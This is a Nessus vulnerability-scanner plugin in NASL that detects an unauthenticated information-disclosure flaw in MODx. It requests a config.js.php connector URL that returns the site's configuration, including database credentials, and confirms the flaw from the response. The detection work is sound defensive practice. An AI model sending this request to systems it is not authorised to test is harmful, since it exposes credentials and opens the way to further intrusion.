#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40419);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_bugtraq_id(35824);

  script_name(english:"MODx config.js.php Information Disclosure");
  script_summary(english:"Retrieves $modx->config as JSON");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server contains a PHP script that is affected by
an information disclosure vulnerability."  );
  script_set_attribute( attribute:"description",   value:
"The remote web server is running MODx, an open source content
management system.

The version of MODx installed on the remote host fails to limit access
to the 'core/model/modx/processors/system/config.js.php' script before
returning the application's configuration settings, including database
credentials.  An unauthenticated, remote attacker may be able to use
this information for further attacks."  );
  script_set_attribute(attribute:"see_also", value:"http://svn.modxcms.com/crucible/changelog/modx/?cs=5501");
  script_set_attribute(
    attribute:"see_also",
    value:"http://modxcms.com/forums/index.php/topic,37961.msg229068.html"
  );
  script_set_attribute( attribute:"solution",   value:
"Upgrade to revision 5505 from the subversion repository or apply the
patch referenced above in the project advisory."  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/07/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:modxcms:modxcms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("modx_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_require_keys("www/PHP", "www/modx");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'modx', port:port, exit_on_fail:TRUE);

dirs = make_list(install['dir']);

foreach dir (dirs)
{
  # Try to exploit the issue.
  #
  # nb: we can't access the affected script directly.
  url = string(
    dir, "/connectors/layout/modx.config.js.php?",
    "action=", SCRIPT_NAME
  );

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

  # There's a problem if we see config info.
  if (
    'MODx.config = {' >< res[2] &&
    '"loader_classes":["modAccessibleObject"],' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report += string(
          "\n",
          "Here is the response showing the installation's configuration\n",
          "settings :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          res[2], "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
exit(0, "The host is not affected.");
